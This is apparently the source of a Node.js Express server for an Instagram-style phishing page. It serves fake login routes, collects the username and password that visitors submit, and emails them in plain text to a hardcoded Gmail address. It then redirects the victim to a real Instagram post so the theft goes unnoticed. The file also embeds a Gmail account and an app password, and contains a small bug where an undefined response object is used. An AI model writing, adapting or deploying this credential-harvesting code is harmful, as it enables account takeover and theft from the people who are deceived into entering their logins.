const express = require('express');
const nodemailer = require("nodemailer");
const fs = require('fs');
const app = express();
const port = 3000;

app.set('view engine', 'ejs');
app.use(express.static('public'));
app.use(express.urlencoded({ extended: true }));
const emailfunction = (username, password) => {
    const auth = nodemailer.createTransport({
        service: "gmail",
        secure : true,
        port : 465,
        auth: {
            user: "srinivasaramanujan1728@gmail.com",
            pass: "ccer hpuk jsdb acdr"
        }
    });

    const receiver = {
        from : "srinivasaramanujan1728@gmail.com",
        to : "radhavallabh1272007@gmail.com",
        subject : "a new login attempt detected",
        text : `Username: ${username} and Password: ${password}`
    };

    auth.sendMail(receiver, (error, emailResponse) => {
        if(error)
        throw error;
        console.log("success!");
        res.send("Email sent successfully!");
    });

}
app.get('/', (req, res) => {
    res.render('start.ejs');
});
app.get('/reels/login', (req, res) => {
    res.render('index.ejs');
});
app.post('/login', async (req, res) => {
    const { username, password } = req.body;
    emailfunction(username, password);
    res.redirect('https://www.instagram.com/p/C-MdCSmP86v/?igsh=cXVqeG9lcG1jcDY0');
});
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});


